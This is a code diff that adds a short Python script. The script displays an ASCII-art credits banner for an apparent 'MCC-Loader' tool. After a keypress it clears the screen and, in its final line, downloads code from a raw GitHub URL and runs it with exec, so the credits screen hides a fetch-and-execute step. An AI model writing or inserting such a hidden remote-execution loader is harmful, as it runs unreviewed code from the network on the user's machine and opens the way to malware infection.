@@ -1,0 +1,33 @@
+Obfuscation = """
+
+
+                                   ██████╗██████╗ ███████╗██████╗ ██╗████████╗███████╗
+                                  ██╔════╝██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝██╔════╝
+                                  ██║     ██████╔╝█████╗  ██║  ██║██║   ██║   ███████╗
+                                  ██║     ██╔══██╗██╔══╝  ██║  ██║██║   ██║   ╚════██║
+                                  ╚██████╗██║  ██║███████╗██████╔╝██║   ██║   ███████║
+                                   ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚══════╝
+
+
+                                 | This tool make by:                                |
+                                 | AprillZerx                                        |
+                                 | PTW Comunity                                      |
+                                 | Reshape Future                                    |
+                                 | Unland Pject                                      |
+                                 | Ghost Blade(Atomic)                               |
+                                 | Help                                              |
+                                 | Wearedevs.net                                     |
+                                 | https://patorjk.com/                              |
+                                 | https://www.anonymoushackers.net/                 |
+                                 | Source: github.com/MCCFree/MCC-Loader/new/main    |
+                                            We are remake from MCC-Loader 1.0.2
+                                            Help by Anonymous Comunity
+                                            Help by PTW Comunity
+"""
+print(Obfuscation)
+while True:
+    print(Obfuscation)
+    msvcrt.getch()
+    os.system('cls')
+    print("Leaving Credit")
+    exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Main').text)
